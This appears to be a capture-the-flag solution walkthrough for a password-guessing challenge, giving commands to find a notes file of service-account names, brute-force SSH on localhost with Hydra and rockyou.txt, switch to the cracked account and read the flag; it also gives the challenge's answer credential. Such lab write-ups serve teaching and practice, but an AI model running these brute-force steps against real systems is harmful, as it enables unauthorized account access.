# Solution Walkthrough: T1110.001 (Password Guessing)

### Step 1: Reconnaissance & Intelligence Gathering
As a low-privileged user on the compromised system, your first step is to hunt for information that could lead to lateral movement. Search for custom directories or `.txt` files that might contain notes.
`find /var -name "*.txt" -type f 2>/dev/null`
You will discover `/var/opt/admin_notes/service_accounts.txt`. Read it to find a list of potential target usernames.

### Step 2: Preparing the Attack
Extract the usernames from the discovered text file and save them to a local file on your attacking machine (or directly on the target if you are operating locally).
`cat /var/opt/admin_notes/service_accounts.txt > users.txt`
Next, prepare a standard password wordlist. For this challenge, a common list like `rockyou.txt` is highly effective. You can simulate the local attack using `su` via a brute-force wrapper, or if SSH is open, attack the SSH service.

### Step 3: Password Guessing (Brute Force)
Use an automated tool like `Hydra` against the SSH service of the localhost (assuming SSH is running), or write a quick bash loop to test `su`.
**Using Hydra (if SSH is available):**
`hydra -L users.txt -P rockyou.txt ssh://127.0.0.1`
*Hydra will output that the password `charlie123` successfully authenticated for the user `sys_backup`.*

**Using a Local Bash Script (if SSH is restricted):**
If you cannot use network services, you can script the `su` command using `expect` or `python` to iterate through the users and top 100 passwords. 

### Step 4: Privilege Escalation and Flag Retrieval
Now that you have the valid credentials, switch to the compromised user account:
`su sys_backup`
*(Enter the password: charlie123)*
Navigate to the user's home directory and read the flag:
`cat /home/sys_backup/flag.txt`
